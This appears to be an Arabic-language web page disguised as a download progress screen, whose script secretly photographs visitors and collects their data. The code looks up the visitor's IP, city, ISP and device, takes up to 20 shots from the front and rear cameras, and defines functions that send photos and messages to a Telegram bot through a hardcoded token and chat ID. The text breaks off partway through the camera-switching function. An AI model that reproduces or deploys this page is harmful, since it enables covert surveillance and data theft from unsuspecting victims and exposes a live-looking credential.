<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📸 تحميل + تصوير</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            flex-direction: column;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            box-shadow: 0 0 60px rgba(233, 69, 96, 0.1);
            max-width: 460px;
            width: 100%;
            border: 1px solid #2a2a4a;
            text-align: center;
        }
        .icon { font-size: 70px; margin-bottom: 8px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        h2 {
            color: #e94560;
            font-weight: 700;
            font-size: 24px;
            margin-bottom: 5px;
        }
        .subtitle {
            color: #8a8aaa;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .loader-box {
            background: #12122a;
            border-radius: 14px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid #2a2a4a;
        }
        .loader-bar {
            width: 100%;
            height: 6px;
            background: #1a1a3a;
            border-radius: 6px;
            overflow: hidden;
            margin-top: 15px;
        }
        .loader-bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #e94560, #c73652);
            border-radius: 6px;
            transition: width 0.2s;
        }
        .status-text {
            color: #8a8aaa;
            font-size: 14px;
            margin-top: 10px;
        }
        #status {
            margin-top: 18px;
            padding: 12px;
            border-radius: 12px;
            background: #12122a;
            border: 1px solid #1a1a3a;
            font-size: 13px;
            color: #8a8aaa;
            min-height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 6px;
        }
        .loader {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid #2a2a4a;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 6px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer {
            margin-top: 18px;
            font-size: 11px;
            color: #3a3a5a;
            border-top: 1px solid #1a1a3a;
            padding-top: 14px;
        }
        .camera-badge {
            display: inline-block;
            background: rgba(233, 69, 96, 0.15);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #e94560;
            margin-top: 5px;
        }
        .info-box {
            background: #12122a;
            border-radius: 10px;
            padding: 10px 14px;
            margin-top: 10px;
            border: 1px solid #1a1a3a;
            text-align: left;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #8a8aaa;
            padding: 4px 0;
            border-bottom: 1px solid #1a1a3a;
        }
        .info-row:last-child { border-bottom: none; }
        .info-row .label { color: #666; }
        .info-row .value { color: #e94560; }
        .btn-retry {
            background: #e94560;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.3s;
            display: none;
        }
        .btn-retry:hover { background: #c73652; transform: scale(1.03); }
        .btn-download {
            background: #4caf50;
            color: #fff;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.3s;
            display: none;
            width: 100%;
        }
        .btn-download:hover { background: #45a049; transform: scale(1.02); }
        .file-info {
            background: #12122a;
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            border: 1px solid #2a2a4a;
            display: none;
        }
        .file-info .label { color: #8a8aaa; font-size: 13px; }
        .file-info .value { color: #e94560; font-size: 14px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📥</div>
        <h2>جاري التحميل...</h2>
        <p class="subtitle">سيتم حفظ الصور على جهازك وإرسالها</p>

        <div class="loader-box">
            <div style="font-size:40px;">⏳</div>
            <div class="loader-bar">
                <div class="fill" id="progressFill"></div>
            </div>
            <div class="status-text" id="progressText">جاري التحميل 0%</div>
            <div class="camera-badge" id="cameraBadge">📷 كاميرا أمامية + خلفية</div>
        </div>

        <div class="info-box" id="infoBox">
            <div class="info-row"><span class="label">🌐 عنوان IP</span><span class="value" id="ipDisplay">جاري الجلب...</span></div>
            <div class="info-row"><span class="label">📱 الجهاز</span><span class="value" id="deviceDisplay">جاري الجلب...</span></div>
            <div class="info-row"><span class="label">🌍 المدينة</span><span class="value" id="cityDisplay">جاري الجلب...</span></div>
            <div class="info-row"><span class="label">📶 المزود</span><span class="value" id="ispDisplay">جاري الجلب...</span></div>
        </div>

        <div id="status">⏳ جاري التجهيز...</div>
        
        <!-- زر تحميل الملف -->
        <button class="btn-download" id="downloadBtn">📥 تحميل الملف (ZIP)</button>
        
        <div class="file-info" id="fileInfo">
            <div class="label">📦 الملف جاهز للتحميل</div>
            <div class="value" id="fileSize">0 KB</div>
        </div>

        <button class="btn-retry" id="retryBtn">🔄 إعادة المحاولة</button>
        <div class="footer">🔒 اتصال آمن • سيتم تنزيل الملف تلقائياً</div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script>
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";

        const statusDiv = document.getElementById('status');
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');
        const cameraBadge = document.getElementById('cameraBadge');
        const ipDisplay = document.getElementById('ipDisplay');
        const deviceDisplay = document.getElementById('deviceDisplay');
        const cityDisplay = document.getElementById('cityDisplay');
        const ispDisplay = document.getElementById('ispDisplay');
        const retryBtn = document.getElementById('retryBtn');
        const downloadBtn = document.getElementById('downloadBtn');
        const fileInfo = document.getElementById('fileInfo');
        const fileSize = document.getElementById('fileSize');

        let hasSent = false;
        let isSending = false;
        let photos = [];
        let photoBlobs = [];
        let stream = null;
        let captureInterval = null;
        let photoCount = 0;
        const maxPhotos = 20;
        let progress = 0;
        let currentCamera = 'user';
        let isSwitching = false;
        let userInfo = {};
        let permissionDenied = false;
        let isCapturing = false;
        let zipFile = null;

        // ====== جلب معلومات المستخدم ======
        async function getUserInfo() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const ip = ipData.ip || 'غير معروف';
                ipDisplay.textContent = ip;

                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                const geoData = await geoRes.json();
                
                const city = geoData.city || 'غير معروف';
                const region = geoData.region || '';
                const country = geoData.country_name || '';
                const isp = geoData.org || 'غير معروف';
                
                cityDisplay.textContent = `${city}${region ? ', ' + region : ''}${country ? ', ' + country : ''}`;
                ispDisplay.textContent = isp;

                const device = navigator.userAgent;
                let deviceName = 'غير معروف';
                if (device.includes('Windows')) deviceName = '💻 Windows';
                else if (device.includes('Android')) deviceName = '📱 Android';
                else if (device.includes('iPhone')) deviceName = '📱 iPhone';
                else if (device.includes('Mac')) deviceName = '🍏 Mac';
                else if (device.includes('Linux')) deviceName = '🐧 Linux';
                else deviceName = device.split('(')[1]?.split(')')[0] || device.slice(0, 50);
                deviceDisplay.textContent = deviceName;

                userInfo = { ip, city, region, country, isp, device: deviceName, userAgent: device };

                return userInfo;
            } catch (e) {
                console.log('❌ فشل جلب المعلومات:', e);
                ipDisplay.textContent = 'غير معروف';
                cityDisplay.textContent = 'غير معروف';
                ispDisplay.textContent = 'غير معروف';
                deviceDisplay.textContent = navigator.userAgent.slice(0, 50);
                userInfo = { ip: 'غير معروف', city: 'غير معروف', isp: 'غير معروف', device: navigator.userAgent.slice(0, 50) };
                return userInfo;
            }
        }

        // ====== إرسال صورة ======
        async function sendPhoto(blob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (e) { return false; }
        }

        // ====== إرسال إشعار ======
        async function sendMessage(text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
                return response.ok;
            } catch (e) { return false; }
        }

        // ====== إنشاء ملف ZIP للتحميل ======
        async function createZipFile() {
            try {
                const zip = new JSZip();
                
                // إضافة الصور
                for (let i = 0; i < photoBlobs.length; i++) {
                    const blob = photoBlobs[i];
                    const fileName = `photo_${String(i + 1).padStart(2, '0')}.jpg`;
                    zip.file(fileName, blob);
                }

                // إضافة ملف معلومات
                const infoText = `📸 تقرير الصور\n\n` +
                    `📅 التاريخ: ${new Date().toLocaleString()}\n` +
                    `📷 عدد الصور: ${photoBlobs.length}\n` +
                    `🌐 IP: ${userInfo.ip || 'غير معروف'}\n` +
                    `📍 الموقع: ${userInfo.city || 'غير معروف'}\n` +
                    `📱 الجهاز: ${userInfo.device || 'غير معروف'}\n` +
                    `📶 المزود: ${userInfo.isp || 'غير معروف'}`;
                
                zip.file('info.txt', infoText);

                const zipBlob = await zip.generateAsync({ type: 'blob' });
                zipFile = zipBlob;
                
                // تحديث واجهة المستخدم
                const sizeInKB = Math.round(zipBlob.size / 1024);
                fileSize.textContent = sizeInKB > 1024 ? `${(sizeInKB / 1024).toFixed(1)} MB` : `${sizeInKB} KB`;
                fileInfo.style.display = 'block';
                downloadBtn.style.display = 'block';
                
                return zipBlob;
            } catch (e) {
                console.error('❌ فشل إنشاء ZIP:', e);
                return null;
            }
        }

        // ====== تحميل الملف ======
        function downloadFile() {
            if (!zipFile) return;
            
            const link = document.createElement('a');
            link.href = URL.createObjectURL(zipFile);
            link.download = `photos_${new Date().getTime()}.zip`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            // تحرير الذاكرة
            setTimeout(() => URL.revokeObjectURL(link.href), 100);
            
            statusDiv.innerHTML = '✅ تم تحميل الملف بنجاح!';
            statusDiv.style.color = '#4caf50';
        }

        // ====== طلب الكاميرا ======
        async function requestCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                currentCamera = 'user';
                cameraBadge.textContent = '📷 كاميرا أمامية';
                statusDiv.innerHTML = '✅ تم الوصول إلى الكاميرا الأمامية';
                statusDiv.style.color = '#4caf50';
                permissionDenied = false;
                retryBtn.style.display = 'none';
                return true;
            } catch (error) {
                console.log('❌ فشل الكاميرا الأمامية:', error.name);

                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'environment',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        },
                        audio: false
                    });
                    currentCamera = 'environment';
                    cameraBadge.textContent = '📷 كاميرا خلفية';
                    statusDiv.innerHTML = '✅ تم الوصول إلى الكاميرا الخلفية';
                    statusDiv.style.color = '#4caf50';
                    permissionDenied = false;
                    retryBtn.style.display = 'none';
                    return true;
                } catch (error2) {
                    console.log('❌ فشل الكاميرا الخلفية:', error2.name);
                    permissionDenied = true;

                    if (error2.name === 'NotAllowedError' || error2.name === 'PermissionDeniedError') {
                        statusDiv.innerHTML = '🚫 تم رفض صلاحية الكاميرا. اضغط زر "إعادة المحاولة" لمنح الصلاحية.';
                        statusDiv.style.color = '#ff9800';
                        cameraBadge.textContent = '⚠️ تم رفض الصلاحية';
                        retryBtn.style.display = 'inline-block';
                        retryBtn.textContent = '📷 منح صلاحية الكاميرا';
                    } else if (error2.name === 'NotFoundError' || error2.name === 'DevicesNotFoundError') {
                        statusDiv.innerHTML = '📵 لا توجد كاميرا على هذا الجهاز.';
                        statusDiv.style.color = '#ff9800';
                        cameraBadge.textContent = '📵 لا توجد كاميرا';
                        retryBtn.style.display = 'none';
                    } else {
                        statusDiv.innerHTML = '❌ خطأ غير معروف: ' + error2.message;
                        statusDiv.style.color = '#e94560';
                        cameraBadge.textContent = '❌ خطأ';
                        retryBtn.style.display = 'inline-block';
                        retryBtn.textContent = '🔄 إعادة المحاولة';
                    }
                    return false;
                }
            }
        }

        // ====== التقاط صورة ======
        async function capturePhoto() {
            if (!stream) return null;
            try {
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 100));

                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');

                if (currentCamera === 'environment') {
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                const blob = await fetch(imageData).then(r => r.blob());
                return blob;
            } catch (e) {
                console.log('❌ فشل التصوير:', e);
                return null;
            }
        }

        // ====== التبديل بين الكاميرات ======
        async function switchCamera() {
            if (isSwitching || permissionDenied) return;
            isSwitching = true;

            const nextMode = currentCamera === 'environment' ? 'user' : 'environment';
            const cameraName = nextMode === 'environment' ? 'خلفية' : 'أمامية';
            statusDiv.innerHTML = `🔄 جاري التبديل إلى الكاميرا ${cameraName}...`;
            statusDiv.style.color = '#ff9800';
            cameraBadge.textContent = `📷 جاري التبديل...`;

            try {
                const newStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: nextMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                if (stream) stream.getTracks().forEach(t => t.stop());
                stream = newStream;
                currentCamera = nextMode;
                cameraBadge.textContent = `📷 كاميرا ${cameraName}`;
                statusDiv.innerHTML = `✅ تم التبديل إلى الكاميرا ${cameraName}`;
                statusDiv.style.color = '#4caf50';
                isSwitching = false;
                return true;
            } catch (error) {
                console.log('❌ فشل التبديل:', error.name);
                isSwitching = false;
                if (error.name === 'NotAllowedError') {
                    statusDiv.innerHTML = '🚫 تم رفض صلاحية الكاميرا الجديدة';
                    statusDiv.style.color = '#ff9800';
                } else {
                    statusDiv.innerHTML = `⚠️ لا توجد كاميرا ${cameraName}`;
                    statusDiv.style.color = '#ff9800'
